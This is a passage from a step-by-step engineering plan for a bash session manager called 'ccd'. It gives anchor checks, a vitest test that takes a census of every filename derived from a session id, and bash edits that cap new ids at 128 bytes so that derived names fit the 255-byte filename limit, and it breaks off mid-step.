grep -n '^# THE ID A WITNESS MAY BE NAMED FOR' ccd/ccd                                 # (c) one line, below (a)
grep -n 'could not find a free slug for \$project"; }$' ccd/ccd                       # (d) one line, inside cmd_ws_add
awk '/^cmd_start\(\) \{/{f=1} f&&/^    id=\$\(_id "\$wrapper" "\$project"\)$/{print NR; exit}' ccd/ccd   # (e) one line
awk '/^cmd_enable\(\) \{/{f=1} f&&/_ws_project_valid "\$2"/{print "proj " NR} f&&/^  _ws_expire_refuse_return "\$id" enable/{print "exp " NR; exit}' ccd/ccd   # (f) "proj N" then "exp M", N < M (Task 5)
grep -n '^CCRC_ID_MAX=' ccd/session-hook.sh                                            # (g) CCRC_ID_MAX=128
grep -n 'nonce="compact-' ccd/session-hook.sh                                          # (h) the 41-byte nonce composition
sed -n '/mint-site census/,/^$/p' .superpowers/sdd/2026-10-12-path-identity-w1b-ccd-id-hardening/progress.md | head -80   # (i) Task 0's census record
```

What each answer means:
- (a), (c), (d), (e) or (f) missing: STOP and report the label. Tasks 1, 5 and 6 own those lines.
- (b) not 0: STOP.
- (c) printing nothing while (a) prints: Task 5 reworded the comment's first line. Anchor the block on the line directly after `_reg_id_ok() {` instead, and record that in the ledger.
- (g) not 128: compute the cap as min(255 − W, (g)), and record it.
- (i) is Task 0's census, from Step 5: W, 255 − W, the excluded files, and the brief's R27/R10 outcome. Step 1's table holds that census as measured at the export `837a099c0`.
  - A template in (i) that Step 1's table lacks is a census row the scan will also report. Add it in Step 1 as `{ file, template, overhead }`, with `overhead` equal to `overheadOf(template)`. That is not a departure.
  - If (i)'s W differs from 81, the code still follows the table, because the test computes the cap. Record both numbers.
  - If 255 − W falls outside 160 to 200, Task 0 has already STOPped the wave.
- **Reversal arms.** If the brief carries an operator reversal, Steps 1 and 3 build it as stated at the end of Step 3. Otherwise they build R27 (a).

- [ ] **Step 1: Write the failing test** `server/test/ccd-id-cap.test.ts`:

```ts
/**
 * A new id fits every name ccd derives from it (path-identity spec §2.6).
 *
 * Three verbs MINT an id: ws-add composes `<project>-<slug>`, and start and enable compose
 * `<wrapper>-<project>`. Every per-id name that ccd, its session hook and the server derive
 * from that id must fit the 255-byte NAME_MAX, or a write that names it fails long after the
 * id exists. Those names are the registry fields, the dot-leading temps, the reap lock, the
 * quarantine slot, the unit and the history sweep's draining file. `ID_NAME_TEMPLATES` is
 * that census, one row per distinct template, with the bytes each adds beyond the id.
 *
 * The cap is NAME_MAX less the widest overhead, lowered to the hook's own id gate
 * (`CCRC_ID_MAX`). A peer id the hook's census skips is a session that silently loses its
 * card, so the lower bound binds.
 *
 * THE CENSUS IS A MECHANISM, NOT A LIST. The anti-whitelist case re-scans `ccd/` (doc and
 * skill text excluded) and `server/src` with the census patterns. A name no row covers reds
 * it, and so does a row whose template its own file no longer holds.
 *
 * Nothing here reaches systemd or tmux. `_supervised_start` logs its argv and `_alive`
 * answers no (`ccd-start-id.test.ts`'s stub shape, copied rather than imported), and ws-add
 * runs under `WS_ADD`.
 */
import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { spawnSync } from 'node:child_process';
import fs from 'node:fs';
import path from 'node:path';
import { CCD, FIXTURE_MOUNTINFO, WS_ADD, ghContainedEnv, makeCcdHarness, type CcdHarness } from './ccdWsHelpers.js';
import { inheritedEnv } from './gitEnvStrip.js';
import { eventsOf } from './lifecycleHelpers.js';

const REPO = path.resolve(__dirname, '../..');
const read = (rel: string): string => fs.readFileSync(path.join(REPO, rel), 'utf8');

const NAME_MAX = 255;

interface IdNameTemplate { readonly file: string; readonly template: string; readonly overhead: number }

/** A registry field is taken at its longest literal in the tree (`archivemanifest`). */
const FIELD_MAX = 15;

/** The widest each placeholder can expand to:
 *  - a pid or BASHPID: 7 digits;
 *  - $RANDOM: 5;
 *  - epoch milliseconds: 13; nanoseconds: 19;
 *  - `_REG_SET_SEQ`: 10;
 *  - the hook nonce `compact-<ms>-<pid>-<R>-<R>`: 41;
 *  - `_hook_write_atomic`'s base, `compactset`: 10.
 *  mktemp's XXXXXX is written literally in its template. */
const WIDTH: Readonly<Record<string, number>> = {
  '<pid>': 7, '<R>': 5, '<ms>': 13, '<ns>': 19, '<seq>': 10, '<nonce>': 41, '<field>': FIELD_MAX, '<base>': 10,
};

/** The bytes a template adds beyond the id: every placeholder at its widest. */
function overheadOf(template: string): number {
  return template.replace('<id>', '').replace(/<[A-Za-z]+>/g, (p) => {
    const w = WIDTH[p];
    if (w === undefined) throw new Error(`no width for the placeholder ${p} in ${template}`);
    return 'x'.repeat(w);
  }).length;
}

/** Task 0's census: one row per distinct template, in the first file the scan finds it in. */
const ID_NAME_TEMPLATES: readonly IdNameTemplate[] = [
  // The id as a whole name: the leaf `~/.cc-tmp/<id>` and the witness `tmproots/<id>`.
  { file: 'ccd/ccd', template: '<id>', overhead: 0 },
  // Every `$REG/<id>.<field>` (and `$_SVC_REG/<id>.<field>`), as one family at the longest field literal.
  { file: 'ccd/ccd', template: '<id>.<field>', overhead: 16 },
  { file: 'ccd/ccd', template: '<id>.hookstate.json', overhead: 15 },
  { file: 'ccd/ccd', template: '<id>.turn.json', overhead: 10 },
  { file: 'ccd/ccd', template: '<id>.supervise.log', overhead: 14 },
  { file: 'server/src/usage.ts', template: '<id>.json', overhead: 5 },
  { file: 'ccd/history/sweep.mjs', template: '<id>.<ms>.<pid>.jsonl', overhead: 28 },
  { file: 'ccd/ccd', template: '.<id>.<field>.<pid>.<seq>.tmp', overhead: 40 },
  { file: 'ccd/ccd', template: '.<id>.<pid>.hookstate.tmp', overhead: 23 },
  { file: 'ccd/ccd', template: '.<id>.compactions.lock', overhead: 18 },
  { file: 'ccd/ccd', template: '.<id>.compactions.lock-init.XXXXXX', overhead: 30 },
  { file: 'ccd/ccd', template: '.<id>.compactions.lock-open.<pid>.<R>.<R>', overhead: 43 },
  { file: 'ccd/ccd', template: '.<id>.generation-init.XXXXXX', overhead: 24 },
  { file: 'ccd/ccd', template: '.<id>.generation-read.<pid>.<R>.<R>', overhead: 37 },
  { file: 'ccd/ccd', template: '.<id>.starts', overhead: 8 },
  { file: 'ccd/ccd', template: '.reap-<id>.lock', overhead: 11 },
  // Keyed on the project, which is shorter than any id composed from it, so this row is an upper bound.
  { file: 'ccd/ccd', template: '.ws-add-<id>.lock', overhead: 13 },
  // The quarantine slot: spec §2.6's 222 was derived from this row alone.
  { file: 'ccd/ccd', template: 'slot.<id>.<ns>.<pid>', overhead: 33 },
  { file: 'ccd/ccd', template: 'claude-session@<id>.service', overhead: 23 },
  { file: 'ccd/session-hook.sh', template: '.<id>.<base>.<pid>.<nonce>.hook-write.tmp', overhead: 77 },
  { file: 'ccd/session-hook.sh', template: '.<id>.compactcard.<pid>.<nonce>.session-claim.tmp', overhead: 81 },
  { file: 'ccd/session-hook.sh', template: '.<id>.compactcard.<pid>.<nonce>.stage', overhead: 69 },
  { file: 'ccd/session-hook.sh', template: '.<id>.compactset.<pid>.<nonce>.stage', overhead: 68 },
  { file: 'ccd/session-hook.sh', template: '.<id>.compactserved-source.<nonce>.XXXXXX', overhead: 71 },
  { file: 'ccd/session-hook.sh', template: '.<id>.compactserved.<nonce>', overhead: 57 },
  { file: 'ccd/session-hook.sh', template: '.<id>.compactions-snapshot.<pid>.<R>.<R>.tmp', overhead: 46 },
  { file: 'ccd/session-hook.sh', template: '.<id>.compactions-stage.<pid>.<R>.<R>.tmp', overhead: 43 },
  { file: 'ccd/session-hook.sh', template: '.<id>.compactpost.<pid>.<R>.<R>.claim', overhead: 39 },
];

/** Every file the census leaves out, each with its reason. Each is also a stated residual. */
const CENSUS_EXCLUDED: readonly { file: string; reason: string }[] = [
  {
    file: 'server/src/token/files.ts',
    reason: 'its `${id}` is a box-token generation id (GENERATION_ID_RE), never a session id: '
      + '`mail-pending-<generation>.token` embeds no registry id',
  },
];

/** Task 0's (e4) patterns as ONE tokenizer:
 *  - a `$REG/<id>.` name, the reap and ws-add locks, the slot, a witness, a leaf and the unit (ccd's bash);
 *  - a `${id}.`/`${sessionId}.` name with its literal prefix (`server/src` and the .mjs files).
 *  A token runs until a quote, a space, a bracket or a separator. */
const CENSUS_TOKEN =
  /(?:\$REG\/\.?\$\{?(?:id|1)\}?\.|\.reap-\$|\.ws-add-\$|slot\.\$\{?id|\/tmproots\/\$|\.cc-tmp\/\$|claude-session@|[A-Za-z0-9._@-]*\$\{(?:id|sessionId)\}\.)[^\s"'`(),;:<>\\]*/g;

/** Every spelling of the id in those templates. `$project` keys the ws-add lock: an upper bound, above. */
const ID_SPELLING = /\$\{1-\}|\$\{1\}|\$1(?![0-9])|\$\{id\}|\$id(?![A-Za-z0-9_])|\$\{sessionId\}|\$project(?![A-Za-z0-9_])/g;

/** Each variable part, as the placeholder `WIDTH` measures. `_hook_write_atomic`'s `$2` is its nonce;
 *  every other `$2` is `_reg_set`'s field. */
const PLACEHOLDERS: ReadonlyArray<readonly [RegExp, string]> = [
  [/\$2(?=\.hook-write)/g, '<nonce>'],
  [/\$\$|\$\{?BASHPID\}?|\$\{pid\}/g, '<pid>'],
  [/\$RANDOM/g, '<R>'],
  [/\$_REG_SET_SEQ/g, '<seq>'],
  [/\$ns(?![A-Za-z0-9_])/g, '<ns>'],
  [/\$nonce(?![A-Za-z0-9_])|\$COMPACT_SERVE_NONCE/g, '<nonce>'],
  [/\$\{tickMs\}/g, '<ms>'],
  [/\$2(?![0-9])|\$\{f\}|\$f(?![A-Za-z0-9_])|\$field(?![A-Za-z0-9_])|\$\{name\}/g, '<field>'],
  [/\$base(?![A-Za-z0-9_])/g, '<base>'],
];

/** A token's template (`<id>` plus placeholders), or null when it names no file: a glob, a prefix, or no id. */
function shapeOf(token: string, after: string): string | null {
  // `"$REG/.reap-$id".lo[c]k` and `"$REG/.$id.compactions.lock-open."*` are globs, and `"$REG/.$id."` is a prefix.
  if (/^"?[.*[]/.test(after) || token.endsWith('.')) return null;
  let s = token;
  if (s.startsWith('claude-session@')) {
    // The instance is the id. systemd appends `.service` when the spelling omits it.
    const inst = /^claude-session@(\$\{?[A-Za-z0-9_]+\}?|%s)/.exec(s);
    if (inst === null) return null;   // `@*`, `@.service`, `@}` or a fixed instance: no id in it
    const rest = s.slice(inst[0].length);
    s = `claude-session@<id>${rest.startsWith('.service') ? rest : `.service${rest}`}`;
  }
  s = s.replace(ID_SPELLING, '<id>');
  // NAME_MAX bounds one path component, so keep the last component that holds the id.
  const parts = s.split('/').filter((c) => c.includes('<id>'));
  if (parts.length === 0) return null;
  s = parts[parts.length - 1];
  for (const [re, ph] of PLACEHOLDERS) s = s.replace(re, ph);
  if (s.includes('*')) return null;
  return s.replace(/[.`,'}\]…]+$/, '');
}

const FAMILY = '<id>.<field>';
function covered(shape: string): boolean {
  if (ID_NAME_TEMPLATES.some((r) => r.template === shape)) return true;
  const field = /^<id>\.([a-z]+)$/.exec(shape);
  return field !== null && field[1].length <= FIELD_MAX && ID_NAME_TEMPLATES.some((r) => r.template === FAMILY);
}

function walk(rel: string): string[] {
  const out: string[] = [];
  for (const e of fs.readdirSync(path.join(REPO, rel), { withFileTypes: true })) {
    const p = path.posix.join(rel, e.name);
    if (e.isDirectory()) out.push(...walk(p)); else out.push(p);
  }
  return out;
}

/** Every file under `ccd/` and `server/src`, with doc text (`*.md`) and skill text excluded. */
const SCANNED = (): string[] => [...walk('ccd'), ...walk('server/src')]
  .filter((f) => !f.endsWith('.md') && !/^ccd\/[a-z]+-skill\//.test(f)).sort();

interface Hit { readonly file: string; readonly line: number; readonly shape: string }
function censusHits(files: readonly string[]): Hit[] {
  const hits: Hit[] = [];
  for (const file of files) {
    read(file).split('\n').forEach((ln, i) => {
      for (const m of ln.matchAll(CENSUS_TOKEN)) {
        const shape = shapeOf(m[0], ln.slice((m.index ?? 0) + m[0].length));
        if (shape !== null) hits.push({ file, line: i + 1, shape });
      }
    });
  }
  return hits;
}

const HOOK = read('ccd/session-hook.sh');
const hookGate = /^CCRC_ID_MAX=(\d+)$/m.exec(HOOK);
const CCRC_ID_MAX = hookGate === null ? Number.NaN : Number(hookGate[1]);
const WIDEST = Math.max(...ID_NAME_TEMPLATES.map((r) => r.overhead));
/** R27 (a): the lower of the room the widest name leaves and the hook's own id gate. Derived here, never
 *  read from ccd, so a raised `_REG_ID_MAX` reds every boundary row too. */
const CAP = Math.min(NAME_MAX - WIDEST, CCRC_ID_MAX);

function bodyOf(text: string, fn: string): string {
  const start = text.indexOf(`\n${fn}() {`);
  if (start < 0) throw new Error(`no ${fn}() { in ccd/ccd`);
  const end = text.indexOf('\n}\n', start);
  return text.slice(start, end < 0 ? text.length : end);
}

const capSentence = (id: string, remedy: string): string =>
  `id '${id}' is ${id.length} bytes; a new id may be at most ${CAP}, so that every name ccd derives from it `
  + `fits the 255-byte name limit — ${remedy}; nothing was created`;

let h: CcdHarness;
beforeEach(() => { h = makeCcdHarness('ccrc-ccd-id-cap-'); });
afterEach(() => { h.cleanup(); });

const STUBS = `_supervised_start() { echo "supervised_start $*" >> "$HOME/ccd-calls"; }; `
  + `_alive() { return 1; };`;

/** Captures all three streams, because the refusals under test exit non-zero. */
const run = (snippet: string): { code: number; stdout: string; stderr: string } => {
  const r = spawnSync('bash', ['-c', `source "${CCD}"; ${snippet}`], {
    encoding: 'utf8', cwd: h.home, timeout: 60000,
    env: ghContainedEnv(h.home, { ...inheritedEnv(), HOME: h.home,
      CCD_MOUNTINFO: path.join(h.home, FIXTURE_MOUNTINFO) }, { systemd: true, tmux: true }),
  });
  return { code: r.status ?? 1, stdout: r.stdout ?? '', stderr: r.stderr ?? '' };
};

const PLANTED_UUID = 'b7001948-0000-4c2f-9a1b-0cfc0dc3d199';
const seedRow = (id: string, wrapper: string, project: string): void => {
  fs.mkdirSync(path.join(h.home, 'projects', project), { recursive: true });
  h.sh(`_reg_set ${id} uuid ${PLANTED_UUID}
    _reg_set ${id} project ${project}
    _reg_set ${id} workdir "$HOME/projects/${project}"
    _reg_set ${id} wrapper ${wrapper}
    _reg_set ${id} started 1`);
};

const supervisedStarts = (): string[] => h.calls().filter((c) => c.startsWith('supervised_start'));

describe('a new id fits every name ccd derives from it (path-identity spec §2.6)', () => {
  it('the cap is the value the census and the ruling give', () => {
    const ccd = read('ccd/ccd');
    for (const r of ID_NAME_TEMPLATES) {
      expect(r.overhead, `${r.template}: its overhead is its parts at their widest`).toBe(overheadOf(r.template));
    }
    // The widths the table relies on are still the tree's.
    expect(HOOK, 'the hook nonce is compact-<13-digit ms>-<pid>-<R>-<R>, at most 41 bytes')
      .toContain('nonce="compact-${at}-${$}-${RANDOM}-${RANDOM}"');
    expect([...HOOK.matchAll(/^\s*_hook_write_atomic "(\$[a-z]+)"/gm)].map((m) => m[1]).sort(),
      '_hook_write_atomic has two callers, whose bases are compactset and turn.json').toEqual(['$mf', '$set']);
    expect(HOOK).toContain('set="$REG/$id.compactset"');
    expect(HOOK).toContain('mf="$REG/$id.turn.json"');
    expect(Number.isInteger(CCRC_ID_MAX), 'ccd/session-hook.sh defines CCRC_ID_MAX=<n> on a line of its own').toBe(true);
    // R10's band: the operator was told "near 175".
    expect(NAME_MAX - WIDEST).toBeGreaterThanOrEqual(160);
    expect(NAME_MAX - WIDEST).toBeLessThanOrEqual(200);
    const defs = [...ccd.matchAll(/^_REG_ID_MAX=(\d+)$/gm)].map((m) => Number(m[1]));
    expect(defs, 'ccd/ccd defines _REG_ID_MAX=<n> exactly once').toHaveLength(1);
    expect(defs[0], 'min(NAME_MAX − the widest overhead, CCRC_ID_MAX)').toBe(CAP);
    // The comment names what decides the number: the widest template, and the hook's gate.
    const at = ccd.indexOf('\n_REG_ID_MAX=');
    const block = ccd.slice(ccd.lastIndexOf('\n# THE COMPOSED-ID CAP', at), at);
    for (const r of ID_NAME_TEMPLATES.filter((x) => x.overhead === WIDEST)) {
      expect(block, `the cap's comment names the widest template ${r.template}`).toContain(r.template);
    }
    expect(block, "the cap's comment names the hook's gate").toContain('CCRC_ID_MAX');
  });

  it('every name template that embeds an id is in the census table', () => {
    const files = SCANNED();
    expect(files.length, 'the census scans something').toBeGreaterThan(100);
    for (const r of ID_NAME_TEMPLATES) expect(files, `${r.template}'s file is one the census scans`).toContain(r.file);
    for (const x of CENSUS_EXCLUDED) {
      expect(files, `${x.file} exists, so its exclusion is not stale`).toContain(x.file);
      expect(censusHits([x.file]).length, `${x.file} still holds a hit, so its exclusion is not stale`).toBeGreaterThan(0);
      expect(x.reason.length, `${x.file} says why it is left out`).toBeGreaterThan(0);
    }
    const excluded = new Set(CENSUS_EXCLUDED.map((x) => x.file));
    const hits = censusHits(files.filter((f) => !excluded.has(f)));
    expect(hits.length, 'the scan finds templates at all').toBeGreaterThan(300);
    expect(hits.filter((x) => !covered(x.shape)).map((x) => `${x.file}:${x.line} ${x.shape}`),
      'a name embeds an id and no census row covers it').toEqual([]);
    expect(ID_NAME_TEMPLATES.filter((r) => !hits.some((x) => x.file === r.file && x.shape === r.template))
      .map((r) => `${r.file} ${r.template}`), 'a census row names a template its file no longer holds').toEqual([]);
    // The field family is taken at the longest field literal in the tree.
    const fields = [...read('ccd/ccd').matchAll(/\b_reg_(?:set|get|read)\s+"?\$\{?[A-Za-z_0-9]+\}?"?\s+([a-z][a-z0-9_-]*)/g)]
      .map((m) => m[1]);
    expect(fields.length, 'the field scan finds the registry writers and readers').toBeGreaterThan(40);
    expect(Math.max(...fields.map((f) => f.length)), 'FIELD_MAX is the longest registry field literal').toBe(FIELD_MAX);
  });

  it('each mint site carries its own die line', () => {
    const ccd = read('ccd/ccd');
    const DIE = /_reg_id_cap "[^"\n]+" \|\| die "\$_REG_ID_CAP_WHY — [^"\n]+; nothing was created"/g;
    for (const fn of ['cmd_ws_add', 'cmd_start', 'cmd_enable']) {
      expect(bodyOf(ccd, fn).match(DIE) ?? [], `${fn} holds exactly one _reg_id_cap … || die "$_REG_ID_CAP_WHY …" line`)
        .toHaveLength(1);
    }
    expect(ccd.match(/_reg_id_cap "/g) ?? [], 'the three mint sites are the cap\'s only callers').toHaveLength(3);
    // ws-add: appended to the slug line (line-neutral), before the fetch and the worktree.
    const add = bodyOf(ccd, 'cmd_ws_add');
    expect(add).toContain('|| die "could not find a free slug for $project"; }; _reg_id_cap "$project-$slug" '
      + '|| die "$_REG_ID_CAP_WHY — choose a shorter project or slug; nothing was created"\n');
    expect(add.indexOf('_reg_id_cap "$project-$slug"')).toBeLessThan(add.indexOf('git -C "$main" fetch origin'));
    // start: directly after the creating form composes the id, whether or not the row exists.
    expect(bodyOf(ccd, 'cmd_start')).toMatch(
      /\n {4}id=\$\(_id "\$wrapper" "\$project"\)\n {4}_reg_id_cap "\$id" \|\| die "\$_REG_ID_CAP_WHY — choose a shorter project; nothing was created"\n/);
    // enable: before the expiry refusal and before the journal.
    const en = bodyOf(ccd, 'cmd_enable');
    const cap = en.indexOf('_reg_id_cap "$id"');
    expect(cap, 'cmd_enable calls the cap').toBeGreaterThan(-1);
    expect(cap).toBeLessThan(en.indexOf('_ws_expire_refuse_return "$id" enable'));
    expect(cap).toBeLessThan(en.indexOf('_lc_done enable'));
    // One definition each, and one source for the sentence.
    expect(ccd.match(/^_reg_id_cap\(\) \{/gm) ?? []).toHaveLength(1);
    expect(ccd.match(/^_REG_ID_CAP_WHY=/gm) ?? []).toHaveLength(1);
    expect(ccd.match(/fits the 255-byte name limit/g) ?? [], "the cap's sentence has one source").toHaveLength(1);
    expect(bodyOf(ccd, '_reg_id_cap'), 'the cap counts BYTES: local LC_ALL=C in its own body').toContain('local LC_ALL=C');
  });

  it('ws-add creates an id of exactly _REG_ID_MAX', () => {
    const project = 'p'.repeat(CAP - 1 - 'quiet-mesa'.length);
    const id = `${project}-quiet-mesa`;
    expect(id).toHaveLength(CAP);
    h.makeRepo(project);
    const r = run(`${WS_ADD} CCD_WS_SLUG=quiet-mesa cmd_ws_add ${project}`);
    expect(r.code, r.stderr).toBe(0);
    expect(h.reg(id, 'uuid'), 'the row of an id exactly at the cap exists').not.toBeNull();
    expect(fs.existsSync(path.join(h.home, 'worktrees', project, 'quiet-mesa'))).toBe(true);
  }, 60_000);

  it('ws-add refuses one byte more, leaving no row, no worktree and no ws/<slug> branch', () => {
    const project = 'p'.repeat(CAP - 'quiet-mesa'.length);
    const id = `${project}-quiet-mesa`;
    expect(id).toHaveLength(CAP + 1);
    const main = h.makeRepo(project);
    for (const argv of [`cmd_ws_add ${project} quiet-mesa`, `CCD_WS_SLUG=quiet-mesa cmd_ws_add ${project}`]) {
      const r = run(`${WS_ADD} ${argv}`);
      expect(r.code, argv).not.toBe(0);
      expect(r.stderr, argv).toContain(capSentence(id, 'choose a shorter project or slug'));
      expect(h.reg(id, 'uuid'), `${argv}: no row`).toBeNull();
      expect(fs.existsSync(path.join(h.home, '.cc-sessions', `${id}.uuid`)), `${argv}: no .uuid`).toBe(false);
      expect(fs.existsSync(path.join(h.home, 'worktrees', project)), `${argv}: no worktree directory`).toBe(false);
      expect(h.git(main, 'branch', '--list', 'ws/quiet-mesa'), `${argv}: no ws/quiet-mesa branch`).toBe('');
    }
  }, 60_000);

  it('start creates _REG_ID_MAX, and refuses one more with no supervised start', () => {
    const ok = 'q'.repeat(CAP - 'claude-b-'.length);
    const okId = `claude-b-${ok}`;
    expect(okId).toHaveLength(CAP);
    fs.mkdirSync(path.join(h.home, 'projects', ok), { recursive: true });
    const a = run(`${STUBS} cmd_start claude-b ${ok}`);
    expect(a.code, a.stderr).toBe(0);
    expect(h.reg(okId, 'uuid'), 'the row of an id exactly at the cap exists').not.toBeNull();
    expect(supervisedStarts()).toContain(`supervised_start ${okId}`);

    const over = 'q'.repeat(CAP - 'claude-b-'.length + 1);
    const overId = `claude-b-${over}`;
    expect(overId).toHaveLength(CAP + 1);
    fs.mkdirSync(path.join(h.home, 'projects', over), { recursive: true });
    const b = run(`${STUBS} cmd_start claude-b ${over}`);
    expect(b.code).not.toBe(0);
    expect(b.stderr).toContain(capSentence(overId, 'choose a shorter project'));
    expect(h.reg(overId, 'uuid'), 'no row for one byte more').toBeNull();
    expect(supervisedStarts().filter((c) => c.includes(overId)), 'no supervised start for one byte more').toEqual([]);
  }, 60_000);

  it('start refuses an over-cap id even when its row already exists', () => {
    const over = 'q'.repeat(CAP - 'claude-b-'.length + 1);
    const overId = `claude-b-${over}`;
    seedRow(overId, 'claude-b', over);
    const r = run(`${STUBS} cmd_start claude-b ${over}`);
    expect(r.code).not.toBe(0);
    expect(r.stderr).toContain(capSentence(overId, 'choose a shorter project'));
    expect(h.reg(overId, 'uuid'), 'the planted row is left as it was').toBe(PLANTED_UUID);
    expect(supervisedStarts(), 'no supervised start').toEqual([]);
  }, 60_000);

  it('enable refuses one more before it journals, and enables exactly _REG_ID_MAX', () => {
    const over = 'q'.repeat(CAP - 'claude-b-'.length + 1);
    const overId = `claude-b-${over}`;
    fs.mkdirSync(path.join(h.home, 'projects', over), { recursive: true });
    const r = run(`${STUBS} cmd_enable claude-b ${over}`);
    expect(r.code).not.toBe(0);
    expect(r.stderr).toContain(capSentence(overId, 'choose a shorter project'));
    expect(eventsOf(h.home, 'enable'), 'no enable row: the cap answers before the journal').toEqual([]);
    expect(eventsOf(h.home, 'start'), 'and start was never reached').toEqual([]);
    expect(supervisedStarts(), 'no supervised start').toEqual([]);
    // THE ACCEPT HALF (path-identity spec §2.8: one pin at the cap and one past it, at every mint site).
    const ok = 'q'.repeat(CAP - 'claude-b-'.length);
    const okId = `claude-b-${ok}`;
    expect(okId).toHaveLength(CAP);
    fs.mkdirSync(path.join(h.home, 'projects', ok), { recursive: true });
    const a = run(`${STUBS} cmd_enable claude-b ${ok}`);
    expect(a.code, a.stderr).toBe(0);
    expect(eventsOf(h.home, 'enable').map((e) => e['id']), 'the id at the cap was enabled').toEqual([okId]);
    expect(supervisedStarts()).toContain(`supervised_start ${okId}`);
  }, 60_000);
});
```

- [ ] **Step 2: Run it and watch it fail**

```bash
cd server && ./node_modules/.bin/vitest run test/ccd-id-cap.test.ts
```

Expected: **6 failed, 2 passed.**
- **Red:**
  - `the cap is the value the census and the ruling give`: "ccd/ccd defines _REG_ID_MAX=<n> exactly once", `expected [] to have a length of 1`.
  - `each mint site carries its own die line`: `cmd_ws_add holds exactly one …`, expected length 1, got 0.
  - `ws-add refuses one byte more, …`: `expected 0 not to be 0`, because ws-add creates the 129-byte id today.
  - `start creates _REG_ID_MAX, and refuses one more …`: its second half, `expected 0 not to be 0`.
  - `start refuses an over-cap id even when its row already exists`: `expected 0 not to be 0`, with `supervised_start claude-b-q…` logged.
  - `enable refuses one more before it journals`: `expected 0 not to be 0`.
- **Green, by design:**
  - `every name template that embeds an id is in the census table` pins the tree as it stands. Its red is mutation M6.
  - `ws-add creates an id of exactly _REG_ID_MAX` is the accept row. Its red is mutation M5.
- **Another failure, such as an uncovered template or a stale row in the anti-whitelist:** this branch's tree differs from the export's census. Reconcile it with Task 0's record (Step 0 (i)): add or correct the row, re-run, and record the change in the ledger. A placeholder `overheadOf` cannot size is `census-placeholder-unsized`: STOP and report.

- [ ] **Step 3: Write the cap block in `ccd/ccd`**

Locate it by content: the `_reg_id_ok() {` line, then the `# THE ID A WITNESS MAY BE NAMED FOR` line after it. Below every frozen anchor, a line may be added.

Before, as Tasks 1 and 5 left it (blank line as Task 1 left it, the witness block's further lines unchanged):

```bash
_reg_id_ok() { local LC_ALL=C; [[ "${1-}" =~ ^[A-Za-z0-9._-]+$ && "${1-}" != -* ]]; }   # word -> 0 iff a --session or positional id may bind it

# THE ID A WITNESS MAY BE NAMED FOR (path-identity spec §2.4): an id `_reg_id_ok` accepts, so never
```

After:

```bash
_reg_id_ok() { local LC_ALL=C; [[ "${1-}" =~ ^[A-Za-z0-9._-]+$ && "${1-}" != -* ]]; }   # word -> 0 iff a --session or positional id may bind it

# THE COMPOSED-ID CAP (path-identity spec §2.6). A NEW id must fit every name ccd, its hook
# and the server derive from it within the 255-byte NAME_MAX, or a write that names it
# fails long after the id exists. The widest such name is the hook's claim temp,
# .<id>.compactcard.<pid>.<nonce>.session-claim.tmp: 81 bytes beyond the id (a 7-digit
# pid, and the 41-byte compact-<ms>-<pid>-<R>-<R> nonce), which leaves 174. The hook's own
# gate is lower: its CCRC_ID_MAX (128) skips a longer peer id in the peer census, and that
# session silently loses its card and its listing. So the cap is 128, the lower of the two.
# ccd-id-cap.test.ts holds the census of every such name, and this number.
#
# BYTES under LC_ALL=C, as `_lc_dec_ok` counts its text. Three sites call it, each before any
# row, worktree, branch or journal line exists, each with its own die line: ws-add (on its slug
# line, after the per-project add lock, which every later ws-add refusal also leaves), start's
# creating form (even when the row exists) and enable's two-argument form.
# `start <id>` and `enable <id>` name a row that already exists and are not capped, so a
# row planted by hand above the cap stays startable that way.
_REG_ID_MAX=128
_REG_ID_CAP_WHY=''   # the cap's one sentence; `_reg_id_cap` sets it whenever it answers 1
_reg_id_cap() {   # id -> 0 iff its BYTES fit _REG_ID_MAX; 1 sets _REG_ID_CAP_WHY. Prints nothing; never dies.
  local LC_ALL=C id="${1-}"
  (( ${#id} <= _REG_ID_MAX )) && return 0
  _REG_ID_CAP_WHY="id '$id' is ${#id} bytes; a new id may be at most $_REG_ID_MAX, so that every name ccd derives from it fits the 255-byte name limit"
  return 1
}

# THE ID A WITNESS MAY BE NAMED FOR (path-identity spec §2.4): an id `_reg_id_ok` accepts, so never
```

The comment rules:
- Only `_lc_dec_ok` and `_reg_id_cap` are backticked, because the danglers scan resolves a backticked `_name`.
- No `$REG/`, `${id}.`, `.reap-$` or `claude-session@` spelling, so the census scan finds nothing new.
- The sentence "fits the 255-byte name limit" appears in the assignment only.

**Reversal arms**, only when the dispatch brief carries one (Task 0, Step 6). Name the arm in the wave-done.
- **R27 (b):**
  - In `ccd/ccd`, write `_REG_ID_MAX=174`. Replace the comment's two sentences from "The hook's own" through "the lower of the two." with: "The hook's CCRC_ID_MAX (128) is not applied (operator ruling): an id of 129 to 174 bytes is skipped by its peer census, the stated residual ids-over-128-invisible-to-the-hook-peer-census."
  - In the test, set `const CAP = NAME_MAX - WIDEST;`, and keep the `CCRC_ID_MAX` block assertion, since the comment still names it.
- **222:**
  - In `ccd/ccd`, write `_REG_ID_MAX=222`. The comment's first paragraph becomes: "The operator kept spec §2.6's 222, which fits the quarantine slot slot.<id>.<ns>.<pid>; the wider names in ccd-id-cap.test.ts's census, the hook's CCRC_ID_MAX gate included, are a stated residual."
  - In the test, set `const CAP = 222;`. In the cap case, drop the R10 band assertions and the widest-template loop, and add `expect(block).toContain('slot.<id>.<ns>.<pid>');`.
  - Record `ID_NAME_TEMPLATES.filter((r) => r.overhead > NAME_MAX - 222)` in the ledger as the residual rows.

- [ ] **Step 4: The three call sites**

**(4a) `cmd_ws_add`, in place and line-neutral.** Before:

```bash
  [[ -z "$slug" ]] && { slug=$(CCD_WS_SLUG="${CCD_WS_SLUG:-}" _ws_slug_new "$project") \
                        || die "could not find a free slug for $project"; }
```

After (the second line is one line):

```bash
  [[ -z "$slug" ]] && { slug=$(CCD_WS_SLUG="${CCD_WS_SLUG:-}" _ws_slug_new "$project") \
                        || die "could not find a free slug for $project"; }; _reg_id_cap "$project-$slug" || die "$_REG_ID_CAP_WHY — choose a shorter project or slug; nothing was created"
```

The cap is a separate command after the `{ …; }` group, so it runs on both paths:
- a positional slug, validated by the `[[ -n "$slug" ]]` block above it;
- a chosen slug, from `CCD_WS_SLUG` or a random one.

It runs before `git -C "$main" fetch origin`, `mkdir -p "$WORKTREES_ROOT/$project"` and `git worktree add`. ws-add composes `local id="$project-$slug"` only after the worktree exists, so the cap cannot wait for it.

**(4b) `cmd_start`, the creating form.** The anchor is the `id=` line inside `cmd_start() {`, directly after Task 5's die text.

Before:

```bash
